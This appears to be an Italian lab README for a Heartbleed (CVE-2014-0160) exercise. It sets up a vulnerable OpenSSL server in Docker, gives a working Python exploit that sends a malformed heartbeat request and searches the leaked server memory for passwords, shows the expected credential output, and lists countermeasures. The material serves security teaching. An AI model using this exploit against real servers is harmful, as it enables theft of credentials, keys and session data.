Lab-13! Clicca "+" → Create new file, scrivi:
lab-13-heartbleed/README.md
Incolla questo:
markdown# Lab 13 — Heartbleed (CVE-2014-0160)

## Obiettivo
Sfruttare la vulnerabilità Heartbleed su un server OpenSSL vulnerabile per estrarre dati dalla memoria del processo, incluse credenziali in chiaro.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali / SEED Ubuntu | 10.0.2.6 | Attaccante |
| Docker container | 127.0.0.1:443 | Server vulnerabile OpenSSL 1.0.1c |

## La vulnerabilità
Client --> Server: "Heartbeat request, payload=1 byte, length=64KB"
Server --> Client: 64KB di memoria RAM (invece di 1 byte)
^ qui ci sono password, chiavi, sessioni
CVE: CVE-2014-0160 | CVSS: 7.5 | Versioni vulnerabili: OpenSSL 1.0.1 - 1.0.1f

## Setup server vulnerabile con Docker
```bash
docker pull andrewmichaelsmith/docker-heartbleed

sudo docker run -d -p 443:443 \
     --security-opt seccomp=unconfined \
     andrewmichaelsmith/docker-heartbleed

sudo docker exec -it $(docker ps -q) openssl version
# --> OpenSSL 1.0.1c 10 May 2012

sudo docker exec -it $(docker ps -q) bash -c \
     "openssl s_client -connect localhost:443 -tlsextdebug 2>&1 | grep -i heart"
# --> TLS server extension "heartbeat" (id=15)
```

## Crea pagina login nel container
```bash
sudo docker exec -it $(docker ps -q) bash -c \
'cat > /var/www/login.html << EOF
<html><body>
<form method="POST" action="login.html">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="submit" value="Login">
</form>
</body></html>
EOF'
```

## Script exploit Python3 — v3
```python
import socket, time

TARGET_IP = "127.0.0.1"
PORT = 443

client_hello = (
    b"\x16\x03\x02\x00\x31"
    b"\x01\x00\x00\x2d"
    b"\x03\x02"
    b"\x50\x0b\xaf\xbb\xb7\x5a\x02\x3b\xfd\xc0\xff\x01"
    b"\xad\x02\x42\x28\x91\xd1\x39\x69\x6a\x28\x1a\x12"
    b"\x60\x07\x3c\xed\xac\xfc\x3f\xfc"
    b"\x00"
    b"\x00\x04"
    b"\x00\x33\x00\xff"
    b"\x01\x00"
    b"\x00\x00"
)

hb_payload = (
    b"\x18"
    b"\x03\x02"
    b"\x00\x03"
    b"\x01"
    b"\x40\x00"
)

def pwn_heartbleed_v3():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    try:
        s.connect((TARGET_IP, PORT))
        s.send(client_hello)
        time.sleep(0.5)
        s.recv(4096)
        for i in range(5):
            print(f"  [>] Tentativo {i+1}...")
            s.send(hb_payload)
            try:
                response = s.recv(16384)
                if b"password" in response:
                    print("[!!!] PASSWORD TROVATA!")
                    print(response.decode('ascii', errors='ignore'))
                    return
            except socket.timeout:
                print("  [-] Timeout.")
            time.sleep(0.2)
    except Exception as e:
        print(f"[-] Errore: {e}")
    finally:
        s.close()

pwn_heartbleed_v3()
```

## Esecuzione attacco
```bash
# Finestra 1 — vittima invia credenziali
curl -k --tlsv1.2 --tls-max 1.2 \
     -X POST -d "username=padella&password=gialla" \
     https://127.0.0.1/login.html &

# Finestra 2 — attaccante lancia exploit
python3 heartbleed_exploit.py
```

## Output atteso
[>] Tentativo 1...
[>] Tentativo 2...
[!!!] PASSWORD TROVATA!
username=padella&password=gialla...

## Confronto 3 versioni exploit
| Feature | v1 loop continuo | v2 single shot | v3 multi-attempt |
|---|---|---|---|
| Loop | Infinito | No | 5 tentativi |
| Output | Solo password | Hex + ASCII | Solo password |
| Use case | Monitoraggio | Debug | Lab interattivo |

## Risultati
- Server OpenSSL 1.0.1c confermato vulnerabile
- Credenziali lette dalla RAM del server
- Fix Python3 applicati: bytes.fromhex(), hand[0] senza ord()

## Contromisure
- Aggiornare OpenSSL a versione >= 1.0.1g
- Rigenerare certificati SSL dopo il patch
- Invalidare tutte le sessioni attive
- IDS/IPS con signature per Heartbleed
